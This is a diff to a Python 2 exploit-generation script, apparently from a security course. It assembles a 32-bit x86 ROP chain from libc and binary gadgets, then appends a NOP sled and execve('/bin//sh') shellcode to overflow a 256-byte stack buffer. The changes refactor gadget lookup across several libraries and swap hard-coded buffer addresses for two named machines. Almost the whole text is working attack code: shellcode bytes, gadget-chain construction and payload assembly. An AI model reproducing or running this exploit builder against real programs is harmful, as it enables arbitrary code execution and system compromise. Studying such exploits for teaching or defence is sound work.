@@ -8,7 +8,11 @@ import os
 import io
 
 register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
-buf_address = 0xbfffeda8
+#krishnan machine
+#buf_address = 0xbfffeda8
+
+#neeraj machine
+buf_address = 0xbffff128 
 buf_len = 256
 packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
@@ -307,37 +311,48 @@ def pack_value(value):
     packed_value = struct.pack("<I", value)
     return packed_value
 
-def build_rop_chain_libc_syscalls(entry):
+def find_gadget_addr(lib_list, func):
+    
+    offset = None
+    for entry in lib_list:
+        offset = func(entry[0])
+        if offset != None:
+            return (entry[1] + offset)
+
+    print 'Unable to find gadget address for %s !' %(func)
+
+def build_rop_chain_libc_syscalls(lib_list):
 
     rop_payload = ""
-    xor_eax_addr = pack_value(entry[1] + find_xor_eax_eax(entry[0]))
+   
+    xor_eax_addr = pack_value(find_gadget_addr(lib_list, find_xor_eax_eax))
     ret_addr = xor_eax_addr
-    rop_payload += ret_addr
+    rop_payload += ret_addr 
 
-    dec_eax_addr = pack_value(entry[1] + find_dec_eax(entry[0]))
+    dec_eax_addr = pack_value(find_gadget_addr(lib_list, find_dec_eax))
     rop_payload += dec_eax_addr
 
-    and_eax_x1000_addr = pack_value(entry[1] + find_and_eax_x1000(entry[0]))
+    and_eax_x1000_addr = pack_value(find_gadget_addr(lib_list, find_and_eax_x1000)) 
     rop_payload += and_eax_x1000_addr
 
-    mov_ecx_eax_addr = pack_value(entry[1] + find_mov_ecx_eax(entry[0]))
+    mov_ecx_eax_addr = pack_value(find_gadget_addr(lib_list, find_mov_ecx_eax))
     rop_payload += mov_ecx_eax_addr
     rop_payload += 4 * pack_value(0x11111111)
 
     rop_payload += xor_eax_addr
 
-    mov_edx_eax_addr = pack_value(entry[1] + find_mov_edx_eax(entry[0]))
+    mov_edx_eax_addr = pack_value(find_gadget_addr(lib_list, find_mov_edx_eax))
     rop_payload += mov_edx_eax_addr
     rop_payload += 3 * pack_value(0x11111111)
 
-    push_esp_addr = pack_value(entry[1] + find_push_esp_pop_ebx(entry[0]))
+    push_esp_addr = pack_value(find_gadget_addr(lib_list, find_push_esp_pop_ebx))
     rop_payload += push_esp_addr
     rop_payload += pack_value(0x11111111)
 
-    xchg_eax_ebx_addr = pack_value(entry[1] + find_xchg_eax_ebx(entry[0]))
+    xchg_eax_ebx_addr = pack_value(find_gadget_addr(lib_list, find_xchg_eax_ebx))
     rop_payload += xchg_eax_ebx_addr
 
-    and_eax_xff_addr = pack_value(entry[1] + find_and_eax_xfffff000(entry[0]))
+    and_eax_xff_addr = pack_value(find_gadget_addr(lib_list, find_and_eax_xfffff000))
     rop_payload += and_eax_xff_addr
     rop_payload += pack_value(0x11111111)
 
@@ -345,18 +360,18 @@ def build_rop_chain_libc_syscalls(entry):
 
     rop_payload += xor_eax_addr
 
-    inc_eax_addr = pack_value(entry[1] + find_inc_eax(entry[0]))
+    inc_eax_addr = pack_value(find_gadget_addr(lib_list, find_inc_eax))
     rop_payload += 7 * inc_eax_addr
 
-    xchg_eax_edx_addr = pack_value(entry[1] + find_xchg_eax_edx(entry[0]))
+    xchg_eax_edx_addr = pack_value(find_gadget_addr(lib_list, find_xchg_eax_edx))
     rop_payload += xchg_eax_edx_addr
 
-    add_eax_x20_addr = pack_value(entry[1] + find_add_eax_x20(entry[0]))
+    add_eax_x20_addr = pack_value(find_gadget_addr(lib_list, find_add_eax_x20))
     rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
 
     rop_payload += 3 * dec_eax_addr
 
-    syscall_addr = pack_value(entry[1] + find_syscall(entry[0]))
+    syscall_addr = pack_value(find_gadget_addr(lib_list, find_syscall))
 
     nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
     nop_sled = "\x90" * nop_len
@@ -536,13 +551,13 @@ if __name__ == '__main__':
                 print 'Unable to get base address for library %s' %(entry)
                 exit(1)
             lib_list.append((disas_map, base_addr, entry))
-    '''
+    
     disas_map = get_binary_instr(args.vuln_bin)
     if disas_map == None:
         print '%s binary not present !' %(args.vuln_bin)
         exit(2)
     lib_list.append((disas_map, 0, args.vuln_bin))
-    '''
+    
 
     #build_rop_chain_libc(lib_list)
-    build_rop_chain_libc_syscalls(lib_list[0])
+    build_rop_chain_libc_syscalls(lib_list)
